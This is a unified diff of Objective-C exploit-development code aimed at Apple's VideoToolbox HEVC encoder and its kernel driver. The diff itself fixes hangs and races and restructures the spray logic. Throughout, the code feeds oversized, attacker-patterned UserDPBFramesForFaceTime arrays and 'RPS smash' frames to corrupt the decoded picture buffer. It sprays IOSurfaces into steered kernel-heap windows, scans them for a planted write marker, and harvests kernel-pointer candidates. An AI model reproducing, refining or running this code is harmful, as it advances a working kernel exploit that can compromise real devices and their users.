@@ -33,42 +33,57 @@ extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t se
 static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
     NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
     if (!sink) return;
+    NSString *entry = nil;
     if (!sb) {
-        [sink addObject:[NSString stringWithFormat:@"cb st=%d no-sample", (int)st]];
-        return;
-    }
-    CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
-                                                          kCMAttachmentMode_ShouldPropagate);
-    if (atts) {
-        NSDictionary *d = (__bridge NSDictionary *)atts;
-        [sink addObject:[NSString stringWithFormat:@"cb st=%d atts=%@", (int)st, d.allKeys]];
-        for (NSString *k in d) {
-            [sink addObject:[NSString stringWithFormat:@"    %@ = %@", k, d[k]]];
-        }
-        CFRelease(atts);
+        entry = [NSString stringWithFormat:@"cb st=%d no-sample", (int)st];
     } else {
-        [sink addObject:[NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st]];
+        CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
+                                                              kCMAttachmentMode_ShouldPropagate);
+        if (atts) {
+            NSDictionary *d = (__bridge NSDictionary *)atts;
+            NSMutableString *ms = [NSMutableString stringWithFormat:@"cb st=%d atts=%@", (int)st, d.allKeys];
+            for (NSString *k in d) {
+                [ms appendFormat:@" %@=%@", k, d[k]];
+            }
+            entry = [ms copy];
+            CFRelease(atts);
+        } else {
+            entry = [NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st];
+        }
+    }
+    @synchronized (sink) {
+        [sink addObject:entry];
     }
 }
 
 // Bounded drain (H9 hang fix): VTCompressionSessionCompleteFrames with
 // kCMTimeInvalid blocks FOREVER once the encoder latches a fault (-12912 /
-// -17691). Glossary fix: wait for `expected` NEW callbacks from entry, or for
-// the arrivals to settle, or timeout - never the full timeout on a dead sink,
-// never an early exit while frames are still in flight.
+// -17691). Wait until sink.count reaches `expected` callbacks (with sink
+// cleared before submission), or until a fault callback arrives, or until
+// arrivals stay idle for >=30ms after starting, bounded by `timeoutMs`.
 static void KPH9Drain(VTCompressionSessionRef s, NSMutableArray *sink, int expected, int timeoutMs) {
-    if (!s) return;
-    if (!sink || expected <= 0) {
-        usleep(30000);
-        return;
-    }
-    int entry = (int)sink.count;
-    int target = entry + expected;
-    int waited = 0, last = -1;
+    if (!s || !sink || expected <= 0) return;
+    int waited = 0, last = 0, idleMs = 0;
     while (waited < timeoutMs) {
-        int now = (int)sink.count;
-        if (now >= target) break;
-        if (now > entry && now == last) break;
+        int now = 0;
+        BOOL faulted = NO;
+        @synchronized (sink) {
+            now = (int)sink.count;
+            if (now > 0) {
+                NSString *tail = [sink lastObject];
+                if (tail && ![tail hasPrefix:@"cb st=0 "]) faulted = YES;
+            }
+        }
+        if (now >= expected) break;
+        if (faulted) break;
+        if (now > 0) {
+            if (now == last) {
+                idleMs += 2;
+                if (idleMs >= 30) break;
+            } else {
+                idleMs = 0;
+            }
+        }
         last = now;
         usleep(2000);
         waited += 2;
@@ -92,20 +107,24 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                         kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
     if (pb) {
-        VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
-        KPH9Drain(s, sink, 1, 120);
+        @synchronized (sink) { [sink removeAllObjects]; }
+        OSStatus idrSt = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+        if (idrSt == noErr) KPH9Drain(s, sink, 1, 60);
     }
     OSStatus sProp = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"),
                                           (__bridge CFTypeRef)payload);
     OSStatus fProp = -1;
-    [sink removeAllObjects];
+    @synchronized (sink) { [sink removeAllObjects]; }
     if (pb) {
         NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": payload };
         fProp = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(ptsSeed, 30), kCMTimeInvalid,
                                                 (__bridge CFDictionaryRef)fp, NULL, NULL);
-        if (fProp == 0) KPH9Drain(s, sink, 1, 120);
+        if (fProp == noErr) KPH9Drain(s, sink, 1, 50);
     }
-    NSString *cb = sink.count ? sink[0] : @"(no cb)";
+    NSString *cb = nil;
+    @synchronized (sink) {
+        cb = sink.count ? sink[0] : @"(no cb)";
+    }
     if (pb) CVPixelBufferRelease(pb);
     VTCompressionSessionInvalidate(s);
     CFRelease(s);
@@ -293,17 +312,23 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
         NSDictionary *idrProps = @{
             (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @YES
         };
+        @synchronized (s4sink) { [s4sink removeAllObjects]; }
         status = VTCompressionSessionEncodeFrame(
             s4, pb, CMTimeMake(0, 30), dur,
             (__bridge CFDictionaryRef)idrProps, NULL, &flags);
         [report appendFormat:@"encode[0] clean IDR -> %d (flags=0x%x)\n", (int)status, flags];
+        if (status == noErr) KPH9Drain(s4, s4sink, 1, 80);
 
         // Analyst 222830: the RPS smash referenced delta_poc frames that do not
         // exist in the DPB (only 1 IDR) - warm the DPB with real P-frames first.
+        @synchronized (s4sink) { [s4sink removeAllObjects]; }
+        int warmQueued4 = 0;
         for (int w = 1; w <= 18; w++) {
-            VTCompressionSessionEncodeFrame(s4, pb, CMTimeMake(w, 30), dur, NULL, NULL, &flags);
+            if (VTCompressionSessionEncodeFrame(s4, pb, CMTimeMake(w, 30), dur, NULL, NULL, &flags) == noErr) {
+                warmQueued4++;
+            }
         }
-        KPH9Drain(s4, s4sink, 19, 2000);
+        KPH9Drain(s4, s4sink, warmQueued4, 600);
         [report appendString:@"DPB warmed with 18 P-frames before smash\n"];
 
         NSDictionary *frameProps = @{
@@ -312,24 +337,30 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             @"DeltaRPSSign": deltaS1,
             (__bridge NSString *)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO
         };
+        @synchronized (s4sink) { [s4sink removeAllObjects]; }
+        int smashQueued4 = 0;
         for (int fi = 1; fi <= 2; fi++) {
             status = VTCompressionSessionEncodeFrame(
                 s4, pb, CMTimeMake(20 + fi, 30), dur,
                 (__bridge CFDictionaryRef)frameProps, NULL, &flags);
             [report appendFormat:@"encode[%d] RPS smash -> %d\n", fi, (int)status];
+            if (status == noErr) smashQueued4++;
         }
         // Analyst: sync return 0 only means queued - drain the pipeline first,
         // then the async cb status shows whether the 32+32 RPS actually reached
         // AVE_HEVC_ST_RPS_Retrieve.
-        KPH9Drain(s4, s4sink, 2, 300);
-        for (NSString *line in s4sink) {
+        if (smashQueued4 > 0) KPH9Drain(s4, s4sink, smashQueued4, 150);
+        NSArray *s4snap = nil;
+        @synchronized (s4sink) {
+            s4snap = [s4sink copy];
+            [s4sink removeAllObjects];
+        }
+        for (NSString *line in s4snap) {
             [report appendFormat:@"  s4cb %@\n", line];
         }
-        [s4sink removeAllObjects];
     }
     if (pb) CVPixelBufferRelease(pb);
     if (s4) {
-        KPH9Drain(s4, s4sink, 0, 30);
         VTCompressionSessionInvalidate(s4);
         CFRelease(s4);
     }
@@ -340,28 +371,29 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     [report appendString:@"\n--- RCMode sweep 0..63 (NTL=3 probe) ---\n"];
     int unclampedRC[64];
     int unclampedCount = 0;
-    for (int rc = 0; rc < 64; rc++) {
-        VTCompressionSessionRef sR = NULL;
-        if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-                                       NULL, NULL, NULL, NULL, NULL, &sR) != noErr || !sR) continue;
+    VTCompressionSessionRef sR = NULL;
+    if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
+                                   NULL, NULL, NULL, NULL, NULL, &sR) == noErr && sR) {
         int usageR = 1;
         CFNumberRef nn = CFNumberCreate(NULL, kCFNumberIntType, &usageR);
         VTSessionSetProperty(sR, CFSTR("EncoderUsage"), nn); CFRelease(nn);
         VTSessionSetProperty(sR, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
         VTSessionSetProperty(sR, CFSTR("RealTime"), kCFBooleanTrue);
-        nn = CFNumberCreate(NULL, kCFNumberIntType, &rc);
-        OSStatus rcSet = VTSessionSetProperty(sR, CFSTR("RCMode"), nn); CFRelease(nn);
-        int probeN = 3;
-        nn = CFNumberCreate(NULL, kCFNumberIntType, &probeN);
-        VTSessionSetProperty(sR, CFSTR("NumberOfTemporalLayers"), nn); CFRelease(nn);
-        int back = -1;
-        CFNumberRef bn = NULL;
-        if (VTSessionCopyProperty(sR, CFSTR("NumberOfTemporalLayers"), NULL, &bn) == noErr && bn) {
-            CFNumberGetValue(bn, kCFNumberIntType, &back); CFRelease(bn);
-        }
-        if (rcSet == 0 && back == 3) {
-            unclampedRC[unclampedCount++] = rc;
-            [report appendFormat:@"  RCMode=%d set=%d readback=%d UNCLAMPED\n", rc, (int)rcSet, back];
+        for (int rc = 0; rc < 64; rc++) {
+            nn = CFNumberCreate(NULL, kCFNumberIntType, &rc);
+            OSStatus rcSet = VTSessionSetProperty(sR, CFSTR("RCMode"), nn); CFRelease(nn);
+            int probeN = 3;
+            nn = CFNumberCreate(NULL, kCFNumberIntType, &probeN);
+            VTSessionSetProperty(sR, CFSTR("NumberOfTemporalLayers"), nn); CFRelease(nn);
+            int back = -1;
+            CFNumberRef bn = NULL;
+            if (VTSessionCopyProperty(sR, CFSTR("NumberOfTemporalLayers"), NULL, &bn) == noErr && bn) {
+                CFNumberGetValue(bn, kCFNumberIntType, &back); CFRelease(bn);
+            }
+            if (rcSet == 0 && back == 3) {
+                unclampedRC[unclampedCount++] = rc;
+                [report appendFormat:@"  RCMode=%d set=%d readback=%d UNCLAMPED\n", rc, (int)rcSet, back];
+            }
         }
         VTCompressionSessionInvalidate(sR);
         CFRelease(sR);
@@ -644,6 +676,35 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     // encoderSpecification at Create and the unclamp COMMITS at Prepare
     // (readback PRE=1, POST=N). Pass 0 = RCMode=20 + rate companions,
     // pass 1 = control without RCMode.
+    // Allocate shared IOSurface spray pool ONCE before the 2-pass sweep so we
+    // do not churn 3.5 GB of kernel wired/surface mappings across 18 rows.
+    CFMutableArrayRef sharedSurfArray = NULL;
+    if (isCreate2 && isLock2 && isUnlock2 && isGetBase2 && isGetSize2) {
+        sharedSurfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @1024,
+            @"IOSurfaceHeight": @512,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @0x42475241,
+        };
+        for (int s = 0; s < 16; s++) {
+            void *surf = isCreate2((__bridge CFDictionaryRef)props);
+            if (surf) {
+                uint32_t seed = 0;
+                if (isLock2(surf, 0, &seed) == KERN_SUCCESS) {
+                    uint8_t *base = (uint8_t *)isGetBase2(surf);
+                    size_t sz = isGetSize2(surf);
+                    if (base && sz > 0) {
+                        for (size_t pOff = 0; pOff < sz; pOff += 0x4000) base[pOff] = 0;
+                    }
+                    isUnlock2(surf, 0, &seed);
+                }
+                CFArrayAppendValue(sharedSurfArray, surf);
+                CFRelease(surf);
+            }
+        }
+    }
+
     int ntlVals[] = { 1, 100, 15967, 16000, 16014, 16115, 16223, 16270, 16431, 16438, 16446, 16447, 16462 };
     for (int pass = 0; pass < 2; pass++) {
     BOOL useRC = (pass == 0);
@@ -653,25 +714,8 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
         int64_t kOff = 16463 - (int64_t)ntl;
         OSStatus rcSt = 0;
 
-        // Spray only for steered kheap windows (k=17..496).
-        CFMutableArrayRef surfArray = NULL;
-        BOOL doSpray = (kOff >= 17 && kOff <= 496) && isCreate2 && isLock2 && isUnlock2 && isGetBase2 && isGetSize2;
-        if (doSpray) {
-            surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
-            for (int s = 0; s < 24; s++) {
-                NSDictionary *props = @{
-                    @"IOSurfaceWidth": @1024,
-                    @"IOSurfaceHeight": @2048,
-                    @"IOSurfaceBytesPerElement": @4,
-                    @"IOSurfacePixelFormat": @0x42475241,
-                };
-                void *surf = isCreate2((__bridge CFDictionaryRef)props);
-                if (surf) {
-                    CFArrayAppendValue(surfArray, surf);
-                    CFRelease(surf);
-                }
-            }
-        }
+        // Use shared spray pool for steered kheap windows (k=17..496).
+        CFMutableArrayRef surfArray = (kOff >= 17 && kOff <= 496) ? sharedSurfArray : NULL;
         [report appendFormat:@"  [%@] NTL=%-5d x0=0x%016llx spray=%ld rcSet=%d\n",
          useRC ? @"RC20" : @"noRC", ntl, x0, surfArray ? (long)CFArrayGetCount(surfArray) : 0L, (int)rcSt];
 
@@ -686,7 +730,6 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             (__bridge CFDictionaryRef)spec2, NULL, NULL, NULL, NULL, &s2);
         if (st2 != noErr || !s2) {
             [report appendFormat:@"  NTL=%d session_create=%d FAILED\n", ntl, (int)st2];
-            if (surfArray) CFRelease(surfArray);
             continue;
         }
         CFNumberRef n;
@@ -742,7 +785,6 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             [report appendFormat:@"  NTL=%d PIXELBUFFER_FAILED\n", ntl];
             VTCompressionSessionInvalidate(s2);
             CFRelease(s2);
-            if (surfArray) CFRelease(surfArray);
             continue;
         }
         CVPixelBufferLockBaseAddress(pb2, 0);
@@ -757,11 +799,10 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
          useRC ? @"RC20" : @"noRC", ntl, (int)setSt, (int)prepSt, rb, (int)st2,
                 (rb == ntl) ? ((st2 == noErr) ? "ARMED" : "FAILED") : "RAN_READBACK_MISMATCH"];
         CVPixelBufferRelease(pb2);
-        KPH9Drain(s2, nil, 0, 30);
         VTCompressionSessionInvalidate(s2);
         CFRelease(s2);
 
-        // Marker scan: did stp x0,x0,[x0] land in one of our surfaces?
+        // Marker scan: check page-offset +0x59 / +0x58 and 64B stride in first 64KB
         if (surfArray) {
             long totalHits = 0;
             CFIndex scount = CFArrayGetCount(surfArray);
@@ -771,14 +812,19 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
                 if (isLock2(surf, 0, &seed) != KERN_SUCCESS) continue;
                 uint8_t *base = (uint8_t *)isGetBase2(surf);
                 size_t sz = isGetSize2(surf);
-                if (base && sz >= 32) {
-                    for (size_t off = 0; off + 32 <= sz; off += 8) {
-                        uint64_t q = *(uint64_t *)(base + off);
-                        if (q == x0) {
-                            uint64_t q2 = *(uint64_t *)(base + off + 8);
-                            uint32_t z = *(uint32_t *)(base + off + 0x18);
+                if (base && sz >= 0x4000) {
+                    for (size_t pageOff = 0; pageOff + 0x80 <= sz; pageOff += 0x4000) {
+                        uint64_t qAligned = *(uint64_t *)(base + pageOff + 0x58);
+                        uint64_t qUnaligned = 0;
+                        memcpy(&qUnaligned, base + pageOff + 0x59, sizeof(uint64_t));
+                        if (qAligned == x0 || qUnaligned == x0) {
+                            size_t hitOff = (qAligned == x0) ? (pageOff + 0x58) : (pageOff + 0x59);
+                            uint64_t q2 = 0;
+                            uint32_t z = 0;
+                            memcpy(&q2, base + hitOff + 8, sizeof(uint64_t));
+                            memcpy(&z, base + hitOff + 0x18, sizeof(uint32_t));
                             [report appendFormat:@"    MARKER HIT surf=%ld off=0x%zx q2=0x%llx z=0x%x\n",
-                             (long)si, off, q2, z];
+                             (long)si, hitOff, q2, z];
                             totalHits++;
                             if (totalHits >= 4) break;
                         }
@@ -789,10 +835,10 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             }
             [report appendFormat:@"    marker scan: %ld hit(s) in %ld surfaces\n",
              totalHits, (long)scount];
-            CFRelease(surfArray);
         }
     }
     }
+    if (sharedSurfArray) CFRelease(sharedSurfArray);
 
     // === B-frame DPB overflow ===
     [report appendString:@"\n--- B-frame DPB overflow ---\n"];
@@ -1141,12 +1187,16 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                 kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbS);
             if (pbS) {
-                VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
-                                                NULL, NULL, NULL);
-                KPH9Drain(sS, cbSink, 1, 120);
+                @synchronized (cbSink) { [cbSink removeAllObjects]; }
+                if (VTCompressionSessionEncodeFrame(sS, pbS, CMTimeMake(0, 30), kCMTimeInvalid,
+                                                    NULL, NULL, NULL) == noErr) {
+                    KPH9Drain(sS, cbSink, 1, 80);
+                }
             }
             [report appendString:@"clean IDR prologue done\n"];
-            for (NSString *line in cbSink) [report appendFormat:@"  %@\n", line];
+            NSArray *cbSnap = nil;
+            @synchronized (cbSink) { cbSnap = [cbSink copy]; }
+            for (NSString *line in cbSnap) [report appendFormat:@"  %@\n", line];
             if (pbS) CVPixelBufferRelease(pbS);
             VTCompressionSessionInvalidate(sS);
             CFRelease(sS);
@@ -1242,37 +1292,47 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                 kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pbW);
             if (pbW) {
-                VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(0, 30), kCMTimeInvalid,
-                                                NULL, NULL, NULL);
-                KPH9Drain(sW, sink, 1, 150);
-                for (int w = 1; w <= 18; w++) {
-                    VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(w, 30), kCMTimeInvalid,
-                                                    NULL, NULL, NULL);
+                @synchronized (sink) { [sink removeAllObjects]; }
+                if (VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(0, 30), kCMTimeInvalid,
+                                                    NULL, NULL, NULL) == noErr) {
+                    KPH9Drain(sW, sink, 1, 80);
                 }
-                KPH9Drain(sW, sink, 18, 1500);
+                @synchronized (sink) { [sink removeAllObjects]; }
+                int warmQueued = 0;
+                for (int w = 1; w <= 18; w++) {
+                    if (VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(w, 30), kCMTimeInvalid,
+                                                        NULL, NULL, NULL) == noErr) {
+                        warmQueued++;
+                    }
+                }
+                KPH9Drain(sW, sink, warmQueued, 600);
             }
             [report appendString:@"  DPB warmed with 1 IDR + 18 P-frames\n"];
             int lastOK = 0, firstReject = 0;
-            for (int n = 32; n <= 64; n++) {
+            int cutoffVals[] = { 16, 17, 18, 19, 20, 24, 32, 48, 64 };
+            for (int ci = 0; ci < 9; ci++) {
+                int n = cutoffVals[ci];
                 NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)n];
                 for (int k = 0; k < n; k++) [arr addObject:@(0x4141414100000000ULL | (unsigned)k)];
                 OSStatus st = VTSessionSetProperty(sW, CFSTR("UserDPBFramesForFaceTime"),
                                                    (__bridge CFTypeRef)arr);
                 OSStatus fe = -1;
                 if (pbW) {
-                    [sink removeAllObjects];
+                    @synchronized (sink) { [sink removeAllObjects]; }
                     NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": arr };
                     fe = VTCompressionSessionEncodeFrame(sW, pbW, CMTimeMake(30 + n, 30),
                                                          kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
-                    if (fe == 0) KPH9Drain(sW, sink, 1, 120);
+                    if (fe == noErr) KPH9Drain(sW, sink, 1, 50);
+                }
+                NSString *cbW = nil;
+                @synchronized (sink) {
+                    cbW = sink.count ? sink[0] : @"(no cb)";
                 }
                 if (st == 0) lastOK = n;
                 else if (!firstReject) firstReject = n;
-                if (st != 0 || fe != 0 || n == 64) {
-                    [report appendFormat:@"  warm n=%-2d set=%d enc=%d cb=%@\n",
-                     n, (int)st, (int)fe, sink.count ? sink[0] : @"(no cb)"];
-                }
+                [report appendFormat:@"  warm n=%-2d set=%d enc=%d cb=%@\n",
+                 n, (int)st, (int)fe, cbW];
             }
             [report appendFormat:@"  warmup cutoff: last_ok=%d first_reject=%d\n", lastOK, firstReject];
             if (pbW) CVPixelBufferRelease(pbW);
@@ -1349,7 +1409,7 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
     // sAddr=0 on __PAGEZERO forever (100% CPU spin), and the submap continue
     // skipped whole submaps. Iteration cap guarantees termination.
     int sIter = 0;
-    while (sIter++ < 4096) {
+    while (sIter++ < 4096 && kptrs2.count < 512) {
         sCnt = VM_REGION_SUBMAP_INFO_COUNT_64;
         if (vm_region_recurse_64(mach_task_self(), &sAddr, &sSize, &sDepth,
                                   (vm_region_recurse_info_t)&sInfo, &sCnt) != KERN_SUCCESS || sSize == 0) break;
@@ -1359,13 +1419,14 @@ static NSString *KPH9DPBProbe(NSArray *payload, int64_t ptsSeed) {
             !KPVMShouldSkipRegion(&sInfo, sAddr, sSize, &sDepth, NULL, NULL, 0)) {
             uint64_t *p = (uint64_t *)sAddr;
             size_t words = sSize / 8;
-            for (size_t i = 0; i < words && i < 8192; i++) {
+            for (size_t i = 0; i < words && i < 8192 && kptrs2.count < 512; i++) {
                 uint64_t v = *(p + i);
                 if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                     [kptrs2 addObject:@(v)];
                 }
             }
         }
+        if (sAddr + sSize <= sAddr) break;
         sAddr += sSize;
     }
     [report appendFormat:@"  filtered candidates: %lu\n", (unsigned long)kptrs2.count];
